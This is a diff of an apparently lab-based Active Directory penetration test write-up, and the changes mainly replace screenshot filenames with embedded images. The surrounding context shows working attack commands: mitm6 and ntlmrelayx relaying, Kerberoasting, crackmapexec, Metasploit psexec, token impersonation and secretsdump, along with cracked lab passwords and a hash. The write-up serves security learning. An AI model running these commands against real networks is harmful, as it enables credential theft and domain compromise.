@@ -28,7 +28,10 @@ Reconnaissance → MITM6 / DNS Takeover → Credential Capture
 ## Phase 1 – Domain Enumeration
 
 **Tool:** PowerShell (PowerView / native)  
-**Screenshot:** `domain_enumeration.png`, `domain_User_enumeration.png`
+<img width="1920" height="1080" alt="domain enumeration" src="https://github.com/user-attachments/assets/785b6d4d-4efc-4b39-a05a-4f4d23612e1d" />
+<img width="1920" height="1080" alt="domain User enumeration" src="https://github.com/user-attachments/assets/22a6305c-461c-4c9f-b4ba-ef0c247696cb" />
+
+
 
 ```powershell
 Get-NetDomain
@@ -72,7 +75,10 @@ Get-NetUser
 ## Phase 3 – MITM6 Attack (IPv6 DNS Poisoning)
 
 **Tool:** `mitm6`  
-**Screenshot:** `mitm6_attack_domain_users.png`, `DNS_Take_over_create_user_account_on_the_domain.png`
+<img width="1920" height="1080" alt="mitm6 attack domain users" src="https://github.com/user-attachments/assets/5423e46c-bff3-4944-9f8e-4c1e9b6cbafe" />
+<img width="1920" height="1080" alt="DNS Take over create user account on the domain" src="https://github.com/user-attachments/assets/e561fb72-ad65-4051-ba0f-ae5cae21c500" />
+
+
 
 ```bash
 cd /opt/mitm6
@@ -94,14 +100,16 @@ ntlmrelayx.py -6 -t ldaps://192.168.88.138 -wh fakewpad -l lootme
 ```
 > ⚠️ **Critical Finding:** Attacker created a domain user with **DCSync privileges** via NTLM relay.
 
-**Domain User Confirmed:** `HgaRqRLoyJ` visible in Active Directory Users and Computers — `AD_Account_created.png`
+**Domain User Confirmed:** `HgaRqRLoyJ` visible in Active Directory Users and Computers — <img width="1920" height="1080" alt="AD Account created" src="https://github.com/user-attachments/assets/22f79de1-3bf9-4e7a-9b08-b210bb045315" />
+
 
 ---
 
 ## Phase 4 – NTLM Hash Capture & Cracking
 
 **Tool:** `hashcat`, `rockyou.txt`  
-**Screenshot:** `cracked_password.png`
+<img width="1920" height="1080" alt="cracked password" src="https://github.com/user-attachments/assets/9342c2c0-2d74-41cc-99f5-190576db0e9d" />
+
 
 **Captured Hash (NetNTLMv2):**
 ```
@@ -127,7 +135,9 @@ Cracked: Password1
 ## Phase 5 – BloodHound / SharpHound Enumeration
 
 **Tool:** BloodHound + SharpHound (data in zip: `20250907165405_file.zip`)  
-**Screenshots:** `All_Domain_Admins.png`, `shortest_path_to_Domain_Admins.png`
+<img width="1920" height="1080" alt="All Domain Admins" src="https://github.com/user-attachments/assets/0d402b0a-b2a3-4d81-8569-9f6e3c17520b" />
+<img width="1920" height="1080" alt="shortest path to Domain Admins" src="https://github.com/user-attachments/assets/3940cab2-504e-4468-8bc8-223c7971411b" />
+
 
 **Domain Admins identified:**
 
@@ -147,7 +157,10 @@ Cracked: Password1
 ## Phase 6 – Kerberoasting
 
 **Tool:** `GetUserSPNs.py` (Impacket)  
-**Screenshots:** `kerberoasting_hash.png`, `kerberos_tgs_password_cracked.png`
+<img width="1920" height="1080" alt="kerberoasting hash" src="https://github.com/user-attachments/assets/98efa016-b044-4e80-b3f0-3988cfd508f7" />
+<img width="1920" height="1080" alt="kerberos tgs password cracked" src="https://github.com/user-attachments/assets/20264309-6555-4171-8ebf-fbe7a9fbbe84" />
+
+
 
 ```bash
 python3 /usr/local/bin/GetUserSPNs.py PEPSTCM.co.za/nholwana:Password1 -dc-ip 192.168.88.138 -request
@@ -179,7 +192,8 @@ Password: MYpassword123#
 ## Phase 7 – CrackMapExec Lateral Movement / Validation
 
 **Tool:** `crackmapexec`  
-**Screenshot:** `crackmapexec.png`
+<img width="1920" height="1080" alt="crackmapexec" src="https://github.com/user-attachments/assets/da953913-859b-4af2-9f8a-0aee93c8eed4" />
+
 
 ```bash
 crackmapexec smb 192.168.88.0/24 -u nholwana -d PEPSTCM.co.za -p Password1
@@ -201,7 +215,10 @@ crackmapexec smb 192.168.88.0/24 -u nholwana -d PEPSTCM.co.za -p Password1
 ## Phase 8 – Metasploit / PSExec & Hash Dumping
 
 **Tool:** Metasploit `exploit/windows/smb/psexec`  
-**Screenshots:** `metasploit_payload_on_nholwana.png`, `dump_hashes_metasploit.png`
+<img width="1920" height="1080" alt="metasploit payload on nholwana" src="https://github.com/user-attachments/assets/7c95d5e9-be10-4caf-9389-4eaf9e2889dd" />
+<img width="1920" height="1080" alt="dump hashes metasploit" src="https://github.com/user-attachments/assets/34964039-9ab6-4ae3-a21b-5f89d31402bb" />
+
+
 
 ```ruby
 use exploit/windows/smb/psexec
@@ -229,7 +246,8 @@ Punisher:1001:...:ffc3ccd1379ed6768b9e80d3f0eed76c:::
 ## Phase 9 – Token Impersonation (Incognito)
 
 **Tool:** Meterpreter incognito module  
-**Screenshot:** `impersonated_nholwana.png`
+<img width="1643" height="886" alt="impersonated nholwana" src="https://github.com/user-attachments/assets/616c6e5b-0d6c-4946-b9fa-c3dd3f822dca" />
+
 
 ```
 meterpreter > load incognito
@@ -242,7 +260,8 @@ meterpreter > impersonate_token pepstcm\\nholwana
 ## Phase 10 – Secretsdump (DCSync)
 
 **Tool:** `secretsdump.py` (Impacket)  
-**Screenshot:** `secretsdump.png`
+<img width="1920" height="1080" alt="secretsdump" src="https://github.com/user-attachments/assets/65914f40-f3aa-448d-b71f-e5c4c3278ced" />
+
 
 ```bash
 # Against workstation (ThePunisher)
